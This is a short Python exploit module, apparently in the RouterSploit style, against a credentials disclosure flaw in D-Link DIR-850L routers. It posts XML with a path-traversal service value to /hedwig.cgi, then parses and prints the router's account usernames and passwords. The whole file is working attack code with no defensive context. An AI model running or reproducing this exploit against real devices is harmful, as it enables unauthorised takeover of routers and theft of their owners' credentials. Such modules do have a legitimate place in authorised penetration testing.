# rsf exploit module
# description: Module exploits D-Link DIR-850L credentials disclosure vulnerability
import re
import requests
import random
import string

def random_text(length=8):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def exploit(target, port=80):
    try:
        headers = {"Content-Type": "text/xml"}
        cookies = {"uid": random_text(8)}
        data = (
            "<?xml version =\"1.0\" encoding=\"utf-8\"?>"
            "<postxml>"
            "<module>"
            "<service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>"
            "</module>"
            "</postxml>"
        )
        
        response = requests.post(
            f"http://{target}:{port}/hedwig.cgi",
            data=data,
            headers=headers,
            cookies=cookies,
            timeout=5
        )
        
        if response.status_code == 200 and "No modules for Hedwig" in response.text:
            pattern = r"<uid>.*</uid>\s*<name>(.*?)</name>\s*<usrid>.*</usrid>\s*<password>(.*?)</password>"
            creds = re.findall(pattern, response.text)
            if creds:
                for username, password in creds:
                    print(f"Username: {username}, Password: {password}")
                return True
        return False
    except:
        return False

def check(target, port=80):
    return exploit(target, port)
